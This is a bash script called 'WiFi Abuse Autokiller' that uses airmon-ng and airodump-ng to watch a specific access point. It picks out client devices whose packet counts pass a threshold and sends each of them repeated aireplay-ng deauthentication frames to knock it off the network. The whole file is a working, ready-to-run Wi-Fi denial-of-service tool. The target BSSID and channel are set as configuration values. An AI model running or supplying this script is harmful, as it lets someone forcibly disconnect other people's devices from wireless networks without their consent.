#!/bin/bash

: <<'ENDINFO'
                 SSSSSSS
             eeeeeeeeeeeeeee
          aaaaaaaaaaaaaaaaaaaa
         nnnnnnnnnnnnnnnnnnnnnn
        pppppppppppppppppppppppp
       22222222222222222222222222
       kkkkkkkkkkkkkkkkkkkkkkkkkk
       ..........................
       cccc       cccc       cccc
        ooo        ooo       oooo
        mmmm      mmmmm      mmm
         SSSSSSSSSSSSSSSSSSSSSS
           eeeeeee   eeeeeeee
            aaaaaaaaaaaaaaaa
             nnnnnnnnnnnnnn
  ppp        pppppppppppppp       ppp
 22222       22222222222222       2222
  kkkkkkk      kkkkkkkkkkk      kkkkkkkk
 .............    .....    ..............
ccccccccccccccccccc   cccccccccccccccccccc
 ooo      oooooooooooooooooooooo
           mmmmmmmmmmmmmmmmmmmmmmmmmm
  SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
  eeeeeeeeeeeee             eeeeeeeeeeeeee
   aaaaa                         aaaaaaaa
     nnnn                            nnnnn

###########################################################################
##############################################################################
>>   ###########################################################################
>>>  ## WiFi Abuse Autokiller        v0.3 by Seanp2k July 20th, 2011           #
>>>  ## WiFi Abuse Autokiller by Seanp2k is licensed under a Creative Commons- #
>>>  ## Attribution-NonCommercial-ShareAlike 3.0 Unported License.             #
>>  ## Based on a work at seanp2k.com                                         #
  ############################################################################
###########################################################################
########################################################################

ENDINFO

##### Basic config #####
# how long to run airodump for to analyze situation (default: 5)
waitsecs=5
# threshold that a station must exceed for us to boot it off the wifi (default: 200)
packetthresh=200
# numeric wifi channel
channel=3
# What is the BSSID that we're booting people off of?
bssid='E0:CB:4E:44:25:10'
# the monitor interface (might require some tweaking if your normal wifi interface drivers can do injection)
moninterface='mon0'
# your normal wifi interface (usually wlan0 for Realtek / Intel or ath0 if using Atheros drivers)
wlaninterface='wlan0'

##### Advanced config (shouldn't need to mess with this) #####
# how many deauth frames do you want to send to each MAC?
deauthframes=10
# what is the exact name of the CSV file that we should parse?  HINT: Leave this alone if you don't know what you're doing
csvfile='airodump-temp-01.csv'
# Pattern for the CSV file that we'll pass to airodump.  See above hint/warning.
csvpattern='airodump-temp'

##### FUNCTIONS #####
cleanup ()
{
    printf 'Caught SIGINT, cleaning up...\n'

    if [[ $(pidof aireplay-ng) ]]; then
        printf 'Found at least one aireplay-ng running, sending SIGKILL...\n'
        for x in $(pidof aireplay-ng); do
            printf "Sending SIGKILL to PID ${x} ...\n"
            kill -9 "${x}"
        done
    fi

    if [[ $(pidof airodump-ng) ]]; then
        printf 'Found at least one airodump-ng running, sending SIGKILL...\n'
        for x in $(pidof airodump-ng); do
            printf "Sending SIGKILL to PID ${x} ...\n"
            kill -9 "${x}"
        done
    fi

    if [[ -f "${csvfile}" ]]; then
        rm -rf "${csvfile}"
        printf 'Found and removed temp CSV...\n'
    else
        printf 'Temp CSV not found...\n'
    fi
    printf 'Cleaning up variables...\n'
    cleanvars
    printf 'Done cleaning up.  Thank you, come again!\n'
    exit 2
}

cleanvars ()
{
    unset waitsecs
    unset packetthresh
    unset channel
    unset bssid
    unset moninterface
    unset wlaninterface
    unset deauthframes
    unset csvfile
    unset csvpattern
    unset wlanmac
    unset stations
    unset i
    unset x
}
##### MAIN #####

# Very first, make sure we are running as root
if [[ ! $(whoami) = 'root' ]]; then
    printf 'This needs to run as the root user\n'
    exit 1
fi

# if the user hits ^c, we need to remove our temp CSV files and kill the aireplay-ng processes.
trap cleanup INT

#// TODO: figure out some better way to automate this.  We could do this...
#// airmon-ng start wlan0 |egrep -o 'mon[0-9]'| head -n1
#// ...but then we can't really grep for it before hand...
#// Possible solution is to figure out all the names a mon interface could be.

# figure out our MAC so we don't commit seppuku
wlanmac=$(ifconfig "${wlaninterface}" | awk '/HWaddr/{print $NF}')

# look for the monitor interface and start it if it doesn't already exist
ifconfig |grep "${moninterface}" || airmon-ng start "${wlaninterface}"

# remove CSV files matching the pattern (disable for testing)
ls -la "${csvpattern}"*.csv && rm -rf "${csvpattern}"*.csv
ls -la "${csvfie}" && rm -rf "${csvfile}"

# run airodump IN THE BACKGROUND (otherwise it'll block and we can't 'sleep' ...
#...on the mon interface and limit to the BSSID and channel specified ...
# ...and write a CSV file out so we can parse that in a minute
airodump-ng "${moninterface}" --bssid "${bssid}" --channel "${channel}" --write "${csvpattern}" --output-format csv &

# wait however many seconds for airodump to run and gather network info for us
sleep "${waitsecs}"

# airodump will run as a "background" process but it'll appear in the foreground...
# ...on the screen.  Kill it after waiting for it to gather data.
killall airodump-ng
clear
printf 'Listing MACs that are about to get a stack of deauth frames in 3 seconds...\r\n'

# set the field seperator (-F) to ',' (comma) since we're parsing a CSV file ...
# ...set the awk variable 'p' to the same as the bash variable '$packetthresh' ...
# ...match the regex '/Station/' then go to the next line (because the '/Station'/ ...
# ...line is just column headers), then see if the 5th column (packet count) is ...
# ...greater than [$packetthresh].  If it is, print the number of packets and ...
# ...the MAC from the CSV file.  Exclude our MAC to avoid seppuku.
awk -F, -v p=${packetthresh} '/Station/ {i=1; next} i && $5 > p {print "Packets:"$5,"--- MAC:",$1}' "${csvfile}" |grep -v "${wlanmac}"
sleep 3

stations=$(awk -F, -v p=${packetthresh} '/Station/ {i=1; next} i && $5 > p {print $1}' "${csvfile}"| grep -v "${wlanmac}")

# print the stations list so we can make sure that it's the same as above
# TODO: improve this so we only have *ONE* awk expression since having two makes this way harder to maintain
#echo $stations

# for each MAC in basically the above AWK stuff without the pretty printing ...
for station in $stations; do
# ...run aireplay and send however many deauth frames to each MAC ...
# ...Do this to all MACs at the same time by backgrounding all processes ...
# ...it's basically ghetto threading :)
    aireplay-ng -D --deauth "${deauthframes}" "${moninterface}" -a "${bssid}" -s "${bssid}" -c "${station}" &
done


#for i in $(awk -F, 'NR > 5 && $5 > 50 {print $1}' "${csvfile}"| grep -v "${wlanmac}"); do
# ...run aireplay and send however many deauth frames to each MAC ...
# ...Do this to all MACs at the same time by backgrounding all processes ...
# ...it's basically ghetto threading :)
#    aireplay-ng -D --deauth "${deauthframes}" "${moninterface}" -a "${bssid}" -s "${bssid}" -c "${i}" &
#done

# wait for all the aireplay-ng processes to finish before exiting the script
# we need this so we can kill them upon ^c
for x in $(pidof aireplay-ng); do
    wait "${x}"
done
printf "$0 Done\n"

cleanvars

# quit and return a valid exit status
exit 0

## old unused stuff
#awk -F, "NR > 5 && $5 > $packetthresh {print 'MAC:',$1,'    Packets:',$5}" airodump-temp-01.csv
#tail -n +6  test-01.csv |awk '{print $7}' |tr -d , |sort -nr|awk NF |head -n3
#awk -F, -v p=$packetthresh 'NR > 5 && $5 > p {print "Packets:"$5,"--- MAC:",$1}' "${csvfile}"
